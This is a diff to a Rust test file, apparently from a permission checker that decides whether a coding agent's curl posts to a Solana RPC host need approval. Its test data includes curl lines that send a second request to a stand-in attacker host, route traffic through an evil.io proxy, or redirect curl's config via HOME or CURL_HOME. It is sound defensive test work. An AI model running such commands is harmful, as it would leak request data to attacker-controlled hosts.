@@ -1562,6 +1562,10 @@ fn an_inline_post_to_a_solana_rpc_host_is_quiet_below_high() {
         format!("curl -d {body} https://api.devnet.solana.com --next -d x https://evil.io"),
         format!("curl -d {body} $RPC"),
         format!("curl -d {body} https://example.convex.cloud/api"),
+        format!("https_proxy=http://evil.io:8080 curl -d {body} https://api.devnet.solana.com"),
+        format!("export ALL_PROXY=evil.io; curl -d {body} https://api.devnet.solana.com"),
+        format!("HOME=/tmp/x curl -d {body} https://api.devnet.solana.com"),
+        format!("CURL_HOME=. curl -d {body} https://api.devnet.solana.com"),
     ];
     for cmd in &still_ask {
         check(cmd, w.x4("Bash", &bash(cmd)), ["ask", "ask", "ask", "ask"]);
